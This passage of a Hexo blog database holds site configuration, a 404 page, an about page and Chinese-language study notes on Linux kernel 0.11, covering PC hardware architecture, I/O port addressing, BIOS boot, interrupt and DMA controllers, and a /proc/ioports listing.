0dedaf343274fbd5636b03cbd34b5fdc03dda","modified":1479378685459},{"_id":"public/images/Linux_0.11_chapter3_as86.png","hash":"5fe2ce50a8cecba78367dcc2838550551f993978","modified":1479378685459},{"_id":"public/images/Linux_0.11_chapter3_as86_boot.png.png","hash":"f0bf256165c7c3eaedf20f2fef3d8b9ba3f3da47","modified":1479378685459}],"Category":[{"name":"study","_id":"civhnccu60003g8uagrk5d8mi"},{"name":"misc","_id":"civhnccwd000kg8uazmr4ynnz"},{"name":"misc","parent":"civhnccu60003g8uagrk5d8mi","_id":"civhnccws000qg8uabl3j2tdz"},{"name":"work","parent":"civhnccu60003g8uagrk5d8mi","_id":"civhncdi20023g8uazd2j8okt"}],"Data":[{"_id":"next","data":{"favicon":"/blog.ico","keywords":"rutk1t0r's blog","rss":null,"since":2016,"canonical":true,"menu":{"home":"/","categories":"/categories","archives":"/archives","about":"/about","tags":"/tags","schedule":"/schedule"},"menu_icons":{"enable":false,"home":"home","about":"user","categories":"th","schedule":"calendar","tags":"tags","archives":"archive","commonweal":"heartbeat"},"scheme":"Pisces","font":{"enable":true,"host":null,"global":{"external":true,"family":"Lato"},"headings":{"external":true,"family":null},"posts":{"external":true,"family":null},"logo":{"external":true,"family":null,"size":null},"codes":{"external":true,"family":null,"size":null}},"social_icons":{"enable":true,"GitHub":"github","Twitter":"twitter","Weibo":"weibo","Facebook":"facebook"},"toc":{"enable":true,"number":true},"sidebar":{"position":"left","display":"post"},"custom_logo":{"enabled":false,"image":null},"highlight_theme":"night bright","scroll_to_more":true,"auto_excerpt":{"enable":true,"length":150},"mathjax":{"enable":false,"cdn":"//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"},"duoshuo_info":{"ua_enable":true,"admin_enable":false,"user_id":0},"facebook_sdk":{"enable":false,"app_id":null,"fb_admin":null,"like_button":null,"webmaster":null},"facebook_comments_plugin":{"enable":false,"num_of_posts":10,"width":"100%","scheme":"light"},"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null},"busuanzi_count":{"enable":false,"site_uv":true,"site_uv_header":"<i class=\"fa fa-user\"></i>","site_uv_footer":null,"site_pv":true,"site_pv_header":"<i class=\"fa fa-eye\"></i>","site_pv_footer":null,"page_pv":true,"page_pv_header":"<i class=\"fa fa-file-o\"></i>","page_pv_footer":null},"baidu_push":false,"calendar":{"enable":false,"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"timeZone":null,"showDeleted":false,"singleEvents":true,"maxResults":250},"use_motion":true,"fancybox":true,"vendors":{"_internal":"lib","jquery":null,"fancybox":null,"fancybox_css":null,"fastclick":null,"lazyload":null,"velocity":null,"velocity_ui":null,"ua_parser":null,"fontawesome":null},"css":"css","js":"js","images":"images","version":"5.0.2","reward_comment":"坚持特色口味技术分享，您的支持将鼓励我继续创作哦！","alipay":"/images/zhifubao.png"}}],"Page":[{"_content":"<!DOCTYPE HTML>\n<html>\n<head>\n    <title>404 - rutk1t0r's blog</title>\n    <meta name=\"description\" content=\"404 Not Found！\">\n    <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\"/>\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" />\n    <meta name=\"robots\" content=\"all\" />\n    <meta name=\"robots\" content=\"index,follow\"/>\n</head>\n<body>\n    <script type=\"text/javascript\" src=\"http://qzonestyle.gtimg.cn/qzone_v6/lostchild/search_children.js\" charset=\"utf-8\"></script>\n</body>\n</html>\n","source":"404.html","raw":"<!DOCTYPE HTML>\n<html>\n<head>\n    <title>404 - rutk1t0r's blog</title>\n    <meta name=\"description\" content=\"404 Not Found！\">\n    <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\"/>\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" />\n    <meta name=\"robots\" content=\"all\" />\n    <meta name=\"robots\" content=\"index,follow\"/>\n</head>\n<body>\n    <script type=\"text/javascript\" src=\"http://qzonestyle.gtimg.cn/qzone_v6/lostchild/search_children.js\" charset=\"utf-8\"></script>\n</body>\n</html>\n","date":"2016-11-14T02:56:10.993Z","updated":"2016-11-14T02:56:10.993Z","path":"404.html","_id":"civhnccoz0000g8ua3laf9pxh","title":"","comments":1,"layout":"page","content":"<!DOCTYPE HTML>\n<html>\n<head>\n    <title>404 - rutk1t0r's blog</title>\n    <meta name=\"description\" content=\"404 Not Found！\">\n    <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">\n    <meta name=\"robots\" content=\"all\">\n    <meta name=\"robots\" content=\"index,follow\">\n</head>\n<body>\n    <script type=\"text/javascript\" src=\"http://qzonestyle.gtimg.cn/qzone_v6/lostchild/search_children.js\" charset=\"utf-8\"></script>\n</body>\n</html>\n","excerpt":"","more":"<!DOCTYPE HTML>\n<html>\n<head>\n    <title>404 - rutk1t0r's blog</title>\n    <meta name=\"description\" content=\"404 Not Found！\">\n    <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\"/>\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" />\n    <meta name=\"robots\" content=\"all\" />\n    <meta name=\"robots\" content=\"index,follow\"/>\n</head>\n<body>\n    <script type=\"text/javascript\" src=\"http://qzonestyle.gtimg.cn/qzone_v6/lostchild/search_children.js\" charset=\"utf-8\"></script>\n</body>\n</html>\n"},{"title":"about","date":"2016-08-17T02:08:55.000Z","type":"about","comments":0,"_content":"#### rutk1t0r@Rutk1t0r:~$ finger \\`whoami\\`\n#### Login: rutk1t0r       \t\t\t\n#### Name: Rutk1t0r\n#### Directory: /home/rutk1t0r          \n#### Shell: /bin/bash\n#### Personal profile: I am an embbeded technology enthusiasts.I like assembly language and C language.I am enthusiastic about Linux kernel and open source projects.I focus on cyber security and Software security and information security.\n#### Email: pgp@rutk1t0r.org\n\n\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2016-08-17 10:08:55\ntype: \"about\"\ncomments: false\n---\n#### rutk1t0r@Rutk1t0r:~$ finger \\`whoami\\`\n#### Login: rutk1t0r       \t\t\t\n#### Name: Rutk1t0r\n#### Directory: /home/rutk1t0r          \n#### Shell: /bin/bash\n#### Personal profile: I am an embbeded technology enthusiasts.I like assembly language and C language.I am enthusiastic about Linux kernel and open source projects.I focus on cyber security and Software security and information security.\n#### Email: pgp@rutk1t0r.org\n\n\n","updated":"2016-11-17T10:25:55.862Z","path":"about/index.html","_id":"civhncdgb001og8ua1qxax9fc","layout":"page","content":"<h4 id=\"rutk1t0r-Rutk1t0r-finger-whoami\"><a href=\"#rutk1t0r-Rutk1t0r-finger-whoami\" class=\"headerlink\" title=\"rutk1t0r@Rutk1t0r:~$ finger `whoami`\"></a>rutk1t0r@Rutk1t0r:~$ finger `whoami`</h4><h4 id=\"Login-rutk1t0r\"><a href=\"#Login-rutk1t0r\" class=\"headerlink\" title=\"Login: rutk1t0r\"></a>Login: rutk1t0r</h4><h4 id=\"Name-Rutk1t0r\"><a href=\"#Name-Rutk1t0r\" class=\"headerlink\" title=\"Name: Rutk1t0r\"></a>Name: Rutk1t0r</h4><h4 id=\"Directory-home-rutk1t0r\"><a href=\"#Directory-home-rutk1t0r\" class=\"headerlink\" title=\"Directory: /home/rutk1t0r\"></a>Directory: /home/rutk1t0r</h4><h4 id=\"Shell-bin-bash\"><a href=\"#Shell-bin-bash\" class=\"headerlink\" title=\"Shell: /bin/bash\"></a>Shell: /bin/bash</h4><h4 id=\"Personal-profile-I-am-an-embbeded-technology-enthusiasts-I-like-assembly-language-and-C-language-I-am-enthusiastic-about-Linux-kernel-and-open-source-projects-I-focus-on-cyber-security-and-Software-security-and-information-security\"><a href=\"#Personal-profile-I-am-an-embbeded-technology-enthusiasts-I-like-assembly-language-and-C-language-I-am-enthusiastic-about-Linux-kernel-and-open-source-projects-I-focus-on-cyber-security-and-Software-security-and-information-security\" class=\"headerlink\" title=\"Personal profile: I am an embbeded technology enthusiasts.I like assembly language and C language.I am enthusiastic about Linux kernel and open source projects.I focus on cyber security and Software security and information security.\"></a>Personal profile: I am an embbeded technology enthusiasts.I like assembly language and C language.I am enthusiastic about Linux kernel and open source projects.I focus on cyber security and Software security and information security.</h4><h4 id=\"Email-pgp-rutk1t0r-org\"><a href=\"#Email-pgp-rutk1t0r-org\" class=\"headerlink\" title=\"Email: pgp@rutk1t0r.org\"></a>Email: pgp@rutk1t0r.org</h4>","excerpt":"","more":"<h4 id=\"rutk1t0r-Rutk1t0r-finger-whoami\"><a href=\"#rutk1t0r-Rutk1t0r-finger-whoami\" class=\"headerlink\" title=\"rutk1t0r@Rutk1t0r:~$ finger `whoami`\"></a>rutk1t0r@Rutk1t0r:~$ finger `whoami`</h4><h4 id=\"Login-rutk1t0r\"><a href=\"#Login-rutk1t0r\" class=\"headerlink\" title=\"Login: rutk1t0r\"></a>Login: rutk1t0r</h4><h4 id=\"Name-Rutk1t0r\"><a href=\"#Name-Rutk1t0r\" class=\"headerlink\" title=\"Name: Rutk1t0r\"></a>Name: Rutk1t0r</h4><h4 id=\"Directory-home-rutk1t0r\"><a href=\"#Directory-home-rutk1t0r\" class=\"headerlink\" title=\"Directory: /home/rutk1t0r\"></a>Directory: /home/rutk1t0r</h4><h4 id=\"Shell-bin-bash\"><a href=\"#Shell-bin-bash\" class=\"headerlink\" title=\"Shell: /bin/bash\"></a>Shell: /bin/bash</h4><h4 id=\"Personal-profile-I-am-an-embbeded-technology-enthusiasts-I-like-assembly-language-and-C-language-I-am-enthusiastic-about-Linux-kernel-and-open-source-projects-I-focus-on-cyber-security-and-Software-security-and-information-security\"><a href=\"#Personal-profile-I-am-an-embbeded-technology-enthusiasts-I-like-assembly-language-and-C-language-I-am-enthusiastic-about-Linux-kernel-and-open-source-projects-I-focus-on-cyber-security-and-Software-security-and-information-security\" class=\"headerlink\" title=\"Personal profile: I am an embbeded technology enthusiasts.I like assembly language and C language.I am enthusiastic about Linux kernel and open source projects.I focus on cyber security and Software security and information security.\"></a>Personal profile: I am an embbeded technology enthusiasts.I like assembly language and C language.I am enthusiastic about Linux kernel and open source projects.I focus on cyber security and Software security and information security.</h4><h4 id=\"Email-pgp-rutk1t0r-org\"><a href=\"#Email-pgp-rutk1t0r-org\" class=\"headerlink\" title=\"Email: pgp@rutk1t0r.org\"></a>Email: pgp@rutk1t0r.org</h4>"},{"title":"categories","date":"2016-08-17T02:04:34.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2016-08-17 10:04:34\ntype: \"categories\"\ncomments: false\n---\n","updated":"2016-11-14T02:56:11.180Z","path":"categories/index.html","_id":"civhncdgr001qg8uantq7jrpw","layout":"page","content":"","excerpt":"","more":""},{"title":"tags","date":"2016-08-17T02:06:18.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2016-08-17 10:06:18\ntype: \"tags\"\ncomments: false\n---\n","updated":"2016-11-14T02:56:11.474Z","path":"tags/index.html","_id":"civhncdh7001tg8uaabrrw97o","layout":"page","content":"","excerpt":"","more":""},{"title":"schedule","date":"2016-11-04T02:08:09.000Z","type":"schedule","comments":0,"_content":"\n2016.11 -> Learning Linux kernel 0.11\n","source":"schedule/index.md","raw":"---\ntitle: schedule\ndate: 2016-11-04 10:08:09\ntype: \"schedule\"\ncomments: false\n---\n\n2016.11 -> Learning Linux kernel 0.11\n","updated":"2016-11-17T10:34:39.315Z","path":"schedule/index.html","_id":"civhncdhm001xg8uasi0nvav2","layout":"page","content":"<p>2016.11 -&gt; Learning Linux kernel 0.11</p>\n","excerpt":"","more":"<p>2016.11 -&gt; Learning Linux kernel 0.11</p>\n"}],"Post":[{"title":"Linux内核0.11完全注释 第一章","date":"2016-11-07T05:38:41.000Z","_content":"\n> 一直想学习Linux内核源码,现在有些时间了,便开始找本书籍开始.从最初的成形版本可以学到当时Linux内核开发者的思考方式,便于理解后期Linux的改进路线.\n\n----------------\n\n\n# Linux诞生和发展\nLinux操作系统的诞生,发展和成长过程依赖于以下五个重要支柱:\nUNIX操作系统:鼻祖\nMINIX操作系统:DEMO版本供学习\nGNU计划:GNU's not Unix,含编辑工具,shell程序,gcc系列编译程序,gdb调试程序等\nPOSIX标准:Linux的未来\nInternet网络:传播的媒介\n\n# 主要版本号\n![kernel_release_1](/images/kernel_release_1.png)\n![kernel_release_2](/images/kernel_release_2.png)\n\n# 内核目录树\n![Linux_kernel_0.11](/images/Linux_kernel_0.11.png)\n\n# 书籍章节划分\n书籍分为了5个部分,第1章至第4章是基础部分.操作系统与所运行的硬件环境密切相关(Intel的80X86保护模式下的编程原理,据说到目前为止Linus本人仍然认为X86系列的处理器比较适合Linux);  \n第二部分包括第5至第7章,描述内核引导启动和32位运行方式的准备阶段,作为学习内核的初学者应该全部进行阅读;  \n第三部分是从第8章到第13章是内核代码的主要部分;  \n第四部分是从14章到16章,作为第三部分的参考部分;  \n第五部分介绍如何使用PC模拟软件系统Bochs针对Linux 0.11内核进行各种实验活动.  \n\n","source":"_posts/Linux内核0-11完全注释-第一章.md","raw":"---\ntitle: Linux内核0.11完全注释 第一章\ndate: 2016-11-07 13:38:41\ncategories:\n- study\ntags:\n- C/C++\n- Linux kernel\n- Asm\n- LDD\n---\n\n> 一直想学习Linux内核源码,现在有些时间了,便开始找本书籍开始.从最初的成形版本可以学到当时Linux内核开发者的思考方式,便于理解后期Linux的改进路线.\n\n----------------\n\n\n# Linux诞生和发展\nLinux操作系统的诞生,发展和成长过程依赖于以下五个重要支柱:\nUNIX操作系统:鼻祖\nMINIX操作系统:DEMO版本供学习\nGNU计划:GNU's not Unix,含编辑工具,shell程序,gcc系列编译程序,gdb调试程序等\nPOSIX标准:Linux的未来\nInternet网络:传播的媒介\n\n# 主要版本号\n![kernel_release_1](/images/kernel_release_1.png)\n![kernel_release_2](/images/kernel_release_2.png)\n\n# 内核目录树\n![Linux_kernel_0.11](/images/Linux_kernel_0.11.png)\n\n# 书籍章节划分\n书籍分为了5个部分,第1章至第4章是基础部分.操作系统与所运行的硬件环境密切相关(Intel的80X86保护模式下的编程原理,据说到目前为止Linus本人仍然认为X86系列的处理器比较适合Linux);  \n第二部分包括第5至第7章,描述内核引导启动和32位运行方式的准备阶段,作为学习内核的初学者应该全部进行阅读;  \n第三部分是从第8章到第13章是内核代码的主要部分;  \n第四部分是从14章到16章,作为第三部分的参考部分;  \n第五部分介绍如何使用PC模拟软件系统Bochs针对Linux 0.11内核进行各种实验活动.  \n\n","slug":"Linux内核0-11完全注释-第一章","published":1,"updated":"2016-11-14T02:56:11.024Z","_id":"civhncctb0001g8uawirx0ye7","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>一直想学习Linux内核源码,现在有些时间了,便开始找本书籍开始.从最初的成形版本可以学到当时Linux内核开发者的思考方式,便于理解后期Linux的改进路线.</p>\n</blockquote>\n<hr>\n<h1 id=\"Linux诞生和发展\"><a href=\"#Linux诞生和发展\" class=\"headerlink\" title=\"Linux诞生和发展\"></a>Linux诞生和发展</h1><p>Linux操作系统的诞生,发展和成长过程依赖于以下五个重要支柱:<br>UNIX操作系统:鼻祖<br>MINIX操作系统:DEMO版本供学习<br>GNU计划:GNU’s not Unix,含编辑工具,shell程序,gcc系列编译程序,gdb调试程序等<br>POSIX标准:Linux的未来<br>Internet网络:传播的媒介</p>\n<h1 id=\"主要版本号\"><a href=\"#主要版本号\" class=\"headerlink\" title=\"主要版本号\"></a>主要版本号</h1><p><img src=\"/images/kernel_release_1.png\" alt=\"kernel_release_1\"><br><img src=\"/images/kernel_release_2.png\" alt=\"kernel_release_2\"></p>\n<h1 id=\"内核目录树\"><a href=\"#内核目录树\" class=\"headerlink\" title=\"内核目录树\"></a>内核目录树</h1><p><img src=\"/images/Linux_kernel_0.11.png\" alt=\"Linux_kernel_0.11\"></p>\n<h1 id=\"书籍章节划分\"><a href=\"#书籍章节划分\" class=\"headerlink\" title=\"书籍章节划分\"></a>书籍章节划分</h1><p>书籍分为了5个部分,第1章至第4章是基础部分.操作系统与所运行的硬件环境密切相关(Intel的80X86保护模式下的编程原理,据说到目前为止Linus本人仍然认为X86系列的处理器比较适合Linux);<br>第二部分包括第5至第7章,描述内核引导启动和32位运行方式的准备阶段,作为学习内核的初学者应该全部进行阅读;<br>第三部分是从第8章到第13章是内核代码的主要部分;<br>第四部分是从14章到16章,作为第三部分的参考部分;<br>第五部分介绍如何使用PC模拟软件系统Bochs针对Linux 0.11内核进行各种实验活动.  </p>\n","excerpt":"","more":"<blockquote>\n<p>一直想学习Linux内核源码,现在有些时间了,便开始找本书籍开始.从最初的成形版本可以学到当时Linux内核开发者的思考方式,便于理解后期Linux的改进路线.</p>\n</blockquote>\n<hr>\n<h1 id=\"Linux诞生和发展\"><a href=\"#Linux诞生和发展\" class=\"headerlink\" title=\"Linux诞生和发展\"></a>Linux诞生和发展</h1><p>Linux操作系统的诞生,发展和成长过程依赖于以下五个重要支柱:<br>UNIX操作系统:鼻祖<br>MINIX操作系统:DEMO版本供学习<br>GNU计划:GNU’s not Unix,含编辑工具,shell程序,gcc系列编译程序,gdb调试程序等<br>POSIX标准:Linux的未来<br>Internet网络:传播的媒介</p>\n<h1 id=\"主要版本号\"><a href=\"#主要版本号\" class=\"headerlink\" title=\"主要版本号\"></a>主要版本号</h1><p><img src=\"/images/kernel_release_1.png\" alt=\"kernel_release_1\"><br><img src=\"/images/kernel_release_2.png\" alt=\"kernel_release_2\"></p>\n<h1 id=\"内核目录树\"><a href=\"#内核目录树\" class=\"headerlink\" title=\"内核目录树\"></a>内核目录树</h1><p><img src=\"/images/Linux_kernel_0.11.png\" alt=\"Linux_kernel_0.11\"></p>\n<h1 id=\"书籍章节划分\"><a href=\"#书籍章节划分\" class=\"headerlink\" title=\"书籍章节划分\"></a>书籍章节划分</h1><p>书籍分为了5个部分,第1章至第4章是基础部分.操作系统与所运行的硬件环境密切相关(Intel的80X86保护模式下的编程原理,据说到目前为止Linus本人仍然认为X86系列的处理器比较适合Linux);<br>第二部分包括第5至第7章,描述内核引导启动和32位运行方式的准备阶段,作为学习内核的初学者应该全部进行阅读;<br>第三部分是从第8章到第13章是内核代码的主要部分;<br>第四部分是从14章到16章,作为第三部分的参考部分;<br>第五部分介绍如何使用PC模拟软件系统Bochs针对Linux 0.11内核进行各种实验活动.  </p>\n"},{"title":"Linux内核0.11完全注释 第二章","date":"2016-11-07T12:19:43.000Z","_content":"\n> 微型计算机组成结构\n\n-------\n# 传统IBM PC及其兼容计算机的组成框图\n可以看出唯有地址总线是单向的,从CPU发出,指向各种控制器和接口.而数据总线和控制总线需要是双向的是由于数据需要读写和控制信号的发出和捕获.\n![Linux_0.11_arch_IBM_Intel](/images/Linux_0.11_arch_IBM_Intel.png)\n# 现代PC机芯片集框图\n![Linux_0.11_modern_PC.png](/images/Linux_0.11_modern_PC.png)\n\n# I/O端口寻址和访问控制方式\n## 端口编址\n1 统一编址:把I/O控制器的端口地址归入存储器寻址地址空间范围内.CPU访问一个端口的操作与访问内存的操作一样,不需要特别的指令.硬件工程师或芯片工程师需确定采用何种编址.\n2 独立编址:把I/O控制器和控制卡的寻址空间单独作为一个独立的地址空间对待,称为I/O地址空间.必须使用特殊指令来操作,例如Intel中的IN和OUT指令.此时引脚接线也不一样.  \n\n\nIBM PC采用了两种方案,独立编址部分采用ISA总线结构分配I/O空间为0x000-0x3ff共1024个端口.统一编址部分例如CGA显卡占据存储器空间0xB8000-0xBC000范围,即CPU地址总线发出此范围的地址并向数据总线上按约定写入ascll值及属性即可显示字符了.  \n### 查看I/O地址范围\n```bash\nrutk1t0r@Rutk1t0r:~$ cat /proc/ioports \n0000-0cf7 : PCI Bus 0000:00\n  0000-001f : dma1\n  0020-0021 : pic1\n  0040-0043 : timer0\n  0050-0053 : timer1\n  0060-0060 : keyboard\n  0062-0062 : PNP0C09:00\n    0062-0062 : EC data\n  0064-0064 : keyboard\n  0066-0066 : PNP0C09:00\n    0066-0066 : EC cmd\n  0070-0077 : rtc0\n  0080-008f : dma page reg\n  00a0-00a1 : pic2\n  00c0-00df : dma2\n  00f0-00ff : fpu\n    00f0-00f0 : PNP0C04:00\n  03c0-03df : vesafb\n  0400-0403 : ACPI PM1a_EVT_BLK\n  0404-0405 : ACPI PM1a_CNT_BLK\n  0408-040b : ACPI PM_TMR\n  0410-0415 : ACPI CPU throttle\n  0420-042f : ACPI GPE0_BLK\n  0430-0433 : iTCO_wdt.2.auto\n  0450-0450 : ACPI PM2_CNT_BLK\n  0454-0457 : pnp 00:02\n  0458-047f : pnp 00:00\n    0460-047f : iTCO_wdt.2.auto\n  0500-057f : pnp 00:00\n  0680-069f : pnp 00:00\n0cf8-0cff : PCI conf1\n0d00-ffff : PCI Bus 0000:00\n  1000-100f : pnp 00:00\n  164e-164f : pnp 00:00\n  2000-2fff : PCI Bus 0000:01\n    2000-20ff : 0000:01:00.0\n      2000-20ff : r8169\n  3000-303f : 0000:00:02.0\n  3040-305f : 0000:00:1f.3\n  3060-307f : 0000:00:1f.2\n    3060-307f : ahci\n  3080-3087 : 0000:00:1f.2\n    3080-3087 : ahci\n  3088-308f : 0000:00:1f.2\n    3088-308f : ahci\n  3090-3093 : 0000:00:1f.2\n    3090-3093 : ahci\n  3094-3097 : 0000:00:1f.2\n    3094-3097 : ahci\n  4000-4fff : PCI Bus 0000:02\n  fd60-fd63 : pnp 00:00\n  ffff-ffff : pnp 00:00\n    ffff-ffff : pnp 00:00\n```\n## 接口访问控制\n### 轮询\nCPU通过在程序中循环查询制定设备控制器中的状态来判断是否与设备进行数据交换.简单耗费CPU时间,适合任务等待时间极短或必须的情况.\n### 中断\n需要中断控制器的支持,顾名思义,当事件发生后,CPU暂停当前程序转而执行I/O中断处理服务过程,之后视情况才恢复被中断的程序.需要早就填充好中断向量表.效率较高.\n### DMA\n用于I/O设备与系统内存之间进行大批量数据传送,整个过程需要使用专门的DMA控制器来进行而CPU在传输过程中无需插手.结合中断配合效率很高的.\n\n# 存储器\n## 主存储器映射\n![Linux_0.11_Main_Memory.png](/images/Linux_0.11_Main_Memory.png)\n## BIOS\n顾名思义,基本的输入/输出系统,存放在ROM中的系统BIOS主要用于计算机开机执行系统各个部分自检,并建立起操作系统要使用的各种配置表,把处理器和系统其余部分初始化到一个已知的状态,且为DOS等系统提供硬件设备接口服务.除此之外Linux操作系统在运行的时候并不适用BIOS中的功能.当计算机系统上电开机或者按下了机箱上的复位按钮时,CPU捕获到信号后把CS寄存器设置为0xF000,段基址被设置为0xFFFF0000,段长度为64K.而EIP寄存器(32位体系)被设置为0xFFF0,因此线性地址计算得到0xFFFFFFF0,这个是写死的.4G空间最后一个64K(以前的8086分段特性)的最后16字节处,一般安排一条JMP跳转指令跳到BIOS代码中64KB范围内的某一条指令开始执行.由于目前PC/AT微机中的BIOS容量大多有1MB-2MB,并存储在FLASH中,因此为了能够执行或者访问BIOS超过64KB范围并且又远远不在0-1M地址空间中的其他BIOS代码或者数据,BIOS程序首先使用一个成为32位大模式技术把数据段寄存器的访问范围设置为4G.此后,BIOS在执行了一系列硬件检测和初始化操作之后,把与原来PC机兼容的64KB BIOS代码和数据复制到内存低端1M末端的64K处,然后跳转到这个地方并且让CPU进入真正的实地址模式工作.如下图,最后BIOS会从硬盘或者其他块启动设备把操作系统引导程序加载在内存0x7c00处(Intel约定),并跳转到这个地方继续执行引导程序.\n![Linux_0.11_ROM_BIOS.png](/images/Linux_0.11_ROM_BIOS.png)\n## CMOS存储器\n主要用来存放计算机实时时钟信息和系统硬件配置信息,这部分内存通常和实时时钟芯片做在一块集成块中,CMOS内存的地址空间在基本内存地址空间之外,需要用I/O指令来访问.\n\n# 控制器和控制卡\n## 中断控制器\nIBM PC/AT 80X86兼容微机采两片级联的8259A可编程中断控制芯片组成一个中断控制器,Linux在内核初始化会继续重新对8259A进行编程来使得其符合自身的控制.\n![Linux_0.11_interrupt_8259A.png](/images/Linux_0.11_interrupt_8259A.png)\n\n## DMA控制器\n采用两块Intel 8237芯片具有8个独立通道,对页面寄存器端口,(偏移)地址寄存器端口和数据寄存器端口进行设置来启用数据传送.由于DMA寄存器是8位的,而地址和计数值是16位值,因此各自需要发送两次.\n\n## 定时/计数器\n采用Intel 8253/8254来产生精确的计时中断信号,动态内存DRAM刷新电路和主机扬声器音调合成.Linux 0.11对通道0进行设置,使其工作在方式3下,并且每隔10ms发出IRQ0,即内核的工作脉搏,用于定时切换任务及统计系统资源量.\n## 键盘控制器\n采用类Intel 8042芯片对键盘的接通码和断开嘛进行扫描并计算.通过IRQ1引脚向CPU发出中断请求.根据三套扫描码集确定具体键盘字符.(早期的键盘控制器P21引脚控制CPU A21信号线开启大范围寻址)\n## 串行控制卡\nPC常用符合RS-232C标准的串行接口,并使用通用异步收发器控制芯片UART组成的串行控制器来处理串行数据的手法工作.\n## 显示控制\nIBM最早推出的PC机视频系统标准有单色MDA标准和彩色CGA标准以及EGA和VGA标准.以后推出的所有高级显卡(包括现在的AGP显卡)虽然都具有极高的图形处理速度和智能加速处理,但是它们都支持这几种标准.Linux 0.1x操作系统仅仅使用了这几种标准都支持的文本显示方式.\n### MDA显示标准\n仅支持黑白两色,并且只支持独有的文本字符显示方式(BIOS显示方式7).屏幕规格80\\*25(列号x=0..79;行号y=0..24),共可以显示2000字符(难怪在Linux中打开shell默认都是80\\*25).每个字符还带有1个属性字节,因此显示一屏(一帧)内容需要占据4KB字节.其中偶地址字节存放字符代码(ascll),奇地址存放显示属性.MDA卡配置有8KB显存.在PC机内存寻址范围中占用0xb0000开始的8K空间(0xb0000-0xb2000).如果显示屏行数是video\\_num\\_lines=25;列数是video\\_num\\_colums=80,那么位于屏幕列行值x,y处的字符和属性在内存中的位置是:  \n字符字节位置 = 0xb0000 + video\\_num\\_colums\\*2\\*y + x\\*2;\n属性字节位置 = 字符字节位置+1;\n> **注意此处坐标系为从屏幕左上角开始往右为x增大,往下为y增大,均不为负值.**  \n\n\n![Linux_0.11_MDA_Color.png](/images/Linux_0.11_MDA_Color.png)\n\n\n\n### CGA显示标准\nCGA支持7种彩色和图形显示方式(BIOS显示方式0-6).在80列\\*25行的文本字符显示方式下,有单色和16色彩色两种显示方式(BIOS显示方式2-3).CGA卡标配有16K显示内存(占用内存地址范围0xb8000-0xbc000),因此可存放4帧信息,同样,在每一帧4K显存中,偶数地址存字符代码,奇数字节存放显示属性.但是在console.c程序中只使用了其中8K显存(0xb8000-0xba000).字符显示属性定义如下:\n![Linux_0.11_CGA_Color.png](/images/Linux_0.11_CGA_Color.png)\n\n### EGA/VGA显示标准\n![Linux_0.11_EGA_VGA.png](/images/Linux_0.11_EGA_VGA.png)\n\n## 软盘和硬盘控制器\n由于软盘片比较容易遭到损坏(发霉或划伤),因此目前计算机中已经逐渐开始不配置软盘驱动器,取而代之的是用U盘.而硬盘作为相对于比较大容量和每比特信息廉价的外存设备,在PC中仍然大量存在.下面是硬盘的一些工作原理:\n![Linux_0.11_hard_disk1.png](/images/Linux_0.11_hard_disk1.png)\n![Linux_0.11_hard_disk2.png](/images/Linux_0.11_hard_disk2.png)\n\n# 总结\n本章介绍了基于Intel 80X86芯片组的计算机组成结构及各个工作部件的工作原理.便于理解操作系统内核的实现,毕竟软件要根据硬件的框架在铺设的.\n","source":"_posts/Linux内核0-11完全注释-第二章.md","raw":"---\ntitle: Linux内核0.11完全注释 第二章\ndate: 2016-11-07 20:19:43\ncategories:\n- study\ntags:\n- C/C++\n- Linux kernel\n- Asm\n- LDD\n---\n\n> 微型计算机组成结构\n\n-------\n# 传统IBM PC及其兼容计算机的组成框图\n可以看出唯有地址总线是单向的,从CPU发出,指向各种控制器和接口.而数据总线和控制总线需要是双向的是由于数据需要读写和控制信号的发出和捕获.\n![Linux_0.11_arch_IBM_Intel](/images/Linux_0.11_arch_IBM_Intel.png)\n# 现代PC机芯片集框图\n![Linux_0.11_modern_PC.png](/images/Linux_0.11_modern_PC.png)\n\n# I/O端口寻址和访问控制方式\n## 端口编址\n1 统一编址:把I/O控制器的端口地址归入存储器寻址地址空间范围内.CPU访问一个端口的操作与访问内存的操作一样,不需要特别的指令.硬件工程师或芯片工程师需确定采用何种编址.\n2 独立编址:把I/O控制器和控制卡的寻址空间单独作为一个独立的地址空间对待,称为I/O地址空间.必须使用特殊指令来操作,例如Intel中的IN和OUT指令.此时引脚接线也不一样.  \n\n\nIBM PC采用了两种方案,独立编址部分采用ISA总线结构分配I/O空间为0x000-0x3ff共1024个端口.统一编址部分例如CGA显卡占据存储器空间0xB8000-0xBC000范围,即CPU地址总线发出此范围的地址并向数据总线上按约定写入ascll值及属性即可显示字符了.  \n### 查看I/O地址范围\n```bash\nrutk1t0r@Rutk1t0r:~$ cat /proc/ioports \n0000-0cf7 : PCI Bus 0000:00\n  0000-001f : dma1\n  0020-0021 : pic1\n  0040-0043 : timer0\n  0050-0053 : timer1\n  0060-0060 : keyboard\n  0062-0062 : PNP0C09:00\n    0062-0062 : EC data\n  0064-0064 : keyboard\n  0066-0066 : PNP0C09:00\n    0066-0066 : EC cmd\n  0070-0077 : rtc0\n  0080-008f : dma page reg\n  00a0-00a1 : pic2\n  00c0-00df : dma2\n  00f0-00ff : fpu\n    00f0-00f0 : PNP0C04:00\n  03c0-03df : vesafb\n  0400-0403 : ACPI PM1a_EVT_BLK\n  0404-0405 : ACPI PM1a_CNT_BLK\n  0408-040b : ACPI PM_TMR\n  0410-0415 : ACPI CPU throttle\n  0420-042f : ACPI GPE0_BLK\n  0430-0433 : iTCO_wdt.2.auto\n  0450-0450 : ACPI PM2_CNT_BLK\n  0454-0457 : 